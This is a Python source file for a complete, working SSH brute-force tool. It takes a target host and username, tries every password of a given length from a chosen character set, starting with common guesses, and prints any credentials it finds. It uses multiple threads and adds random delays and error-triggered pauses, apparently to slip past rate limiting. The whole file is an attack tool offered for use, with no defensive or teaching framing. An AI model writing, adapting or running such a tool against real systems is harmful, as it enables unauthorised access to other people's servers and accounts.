#!/usr/bin/env python3
import paramiko
import sys
import string
import itertools
import time
import argparse
from threading import Thread, Lock
from queue import Queue
import socket
import signal
import random

# Configuration
MAX_THREADS = 5  # Reduced thread count for stability
CONNECTION_TIMEOUT = 8  # Increased timeout
BANNER_TIMEOUT = 25
RETRY_DELAY = 2  # Increased delay after errors
MAX_ERRORS_BEFORE_PAUSE = 3  # Pause after this many consecutive errors
PAUSE_DURATION = 10  # Seconds to pause after many errors
PRIORITY_PATTERNS = {
    3: ['AAA', 'BBB', 'CCC', 'ADM', 'PWD', 'SYS', 'ADM', '123', 'QWE']
}

class BruteForcer:
    def __init__(self, args):
        self.args = args
        self.charset = self.build_charset()
        self.found = False
        self.shutdown = False
        self.lock = Lock()
        self.queue = Queue(maxsize=5000)  # Limited queue size
        self.attempts = 0
        self.start_time = time.time()
        self.last_print = 0
        self.connection_errors = 0
        self.consecutive_errors = 0
        self.last_error_time = 0

        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signum, frame):
        with self.lock:
            self.shutdown = True
            self.found = True
        print("\n[!] Shutting down gracefully...")

    def build_charset(self):
        if self.args.upper:
            return string.ascii_uppercase
        if self.args.lower:
            return string.ascii_lowercase
        if self.args.digits:
            return string.digits
        if self.args.special:
            return self.args.special
        return string.ascii_letters + string.digits + '!@#$%^&*'

    def optimized_generator(self):
        # Yield priority patterns first
        if self.args.length in PRIORITY_PATTERNS:
            for pattern in PRIORITY_PATTERNS[self.args.length]:
                yield pattern

        # Then yield all combinations
        for pwd in itertools.product(self.charset, repeat=self.args.length):
            if self.shutdown:
                break
            yield ''.join(pwd)

    def handle_connection_error(self, error_msg):
        with self.lock:
            self.connection_errors += 1
            self.consecutive_errors += 1
            current_time = time.time()

            # If many errors close together, pause longer
            if (self.consecutive_errors >= MAX_ERRORS_BEFORE_PAUSE and
                current_time - self.last_error_time < 5):
                print(f"\n[!] Multiple errors detected. Pausing for {PAUSE_DURATION} seconds...")
                time.sleep(PAUSE_DURATION)
                self.consecutive_errors = 0
            else:
                # Random jitter to avoid predictable retries
                sleep_time = RETRY_DELAY + random.uniform(0, 1)
                time.sleep(sleep_time)

            self.last_error_time = current_time

    def try_connect(self, password):
        ssh = None
        try:
            # Create socket with timeout
            sock = socket.create_connection(
                (self.args.host, 22),
                timeout=CONNECTION_TIMEOUT
            )
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Add small random delay between connection attempts
            time.sleep(random.uniform(0, 0.3))

            ssh.connect(
                self.args.host,
                username=self.args.username,
                password=password,
                sock=sock,
                timeout=CONNECTION_TIMEOUT,
                banner_timeout=BANNER_TIMEOUT,
                auth_timeout=CONNECTION_TIMEOUT,
                look_for_keys=False,
                allow_agent=False
            )
            return True

        except paramiko.AuthenticationException:
            with self.lock:
                self.consecutive_errors = 0  # Reset on auth failure
            return False
        except (paramiko.SSHException, socket.error) as e:
            self.handle_connection_error(str(e))
            return False
        except Exception as e:
            print(f"\n[!] Unexpected error: {str(e)}")
            return False
        finally:
            if ssh:
                try:
                    ssh.close()
                except:
                    pass

    def worker(self):
        while not self.shutdown and not self.found:
            try:
                password = self.queue.get_nowait()
            except:
                break

            if self.shutdown or self.found:
                self.queue.task_done()
                return

            if self.try_connect(password):
                with self.lock:
                    self.found = True
                    print(f"\n[+] Success! Credentials: {self.args.username}:{password}")
                    self.queue.task_done()
                    return

            with self.lock:
                self.attempts += 1
                current_time = time.time()
                if current_time - self.last_print > 1.0:
                    rate = self.attempts / max(1, (current_time - self.start_time))
                    print(f"\rAttempts: {self.attempts:,} | Rate: {rate:.1f}/sec | "
                          f"Elapsed: {current_time - self.start_time:.1f}s | "
                          f"Errors: {self.connection_errors} | Current: {password}",
                          end='', flush=True)
                    self.last_print = current_time

            self.queue.task_done()

    def run(self):
        # Fill queue with initial batch
        gen = self.optimized_generator()
        while not self.shutdown and self.queue.qsize() < 1000:
            try:
                self.queue.put(next(gen), block=False)
            except StopIteration:
                break
            except:
                time.sleep(0.1)

        # Start worker threads
        threads = []
        for _ in range(min(MAX_THREADS, self.queue.qsize())):
            t = Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)

        # Keep queue filled
        while not self.shutdown and not self.found:
            try:
                if self.queue.qsize() < 500:
                    try:
                        self.queue.put(next(gen), block=False)
                    except StopIteration:
                        break
                time.sleep(0.1)
            except KeyboardInterrupt:
                self.signal_handler(signal.SIGINT, None)

        # Clean up
        self.shutdown = True
        self.queue.join()

        for t in threads:
            t.join(timeout=1)

        print(f"\n[*] Finished after {self.attempts:,} attempts")
        print(f"[*] Total connection errors: {self.connection_errors}")
        print(f"[*] Total time: {time.time() - self.start_time:.1f} seconds")

def main():
    parser = argparse.ArgumentParser(description='Resilient SSH Brute Force Tool')
    parser.add_argument('host', help='Target host')
    parser.add_argument('username', help='Username to brute force')
    parser.add_argument('length', type=int, help='Password length')
    parser.add_argument('--lower', action='store_true', help='Include lowercase letters')
    parser.add_argument('--upper', action='store_true', help='Include uppercase letters')
    parser.add_argument('--digits', action='store_true', help='Include digits')
    parser.add_argument('--special', type=str, default='', help='Special characters to include')

    args = parser.parse_args()

    bruteforcer = BruteForcer(args)

    print(f"[*] Starting attack on {args.host}")
    print(f"[*] Targeting username: {args.username}")
    print(f"[*] Testing passwords of length {args.length}")
    print(f"[*] Using character set: {bruteforcer.charset}")
    print(f"[*] Character set size: {len(bruteforcer.charset)}")
    print(f"[*] Estimated max attempts: {pow(len(bruteforcer.charset), args.length):,}")
    print(f"[*] Using {MAX_THREADS} threads with adaptive rate limiting")

    bruteforcer.run()

if __name__ == "__main__":
    main()
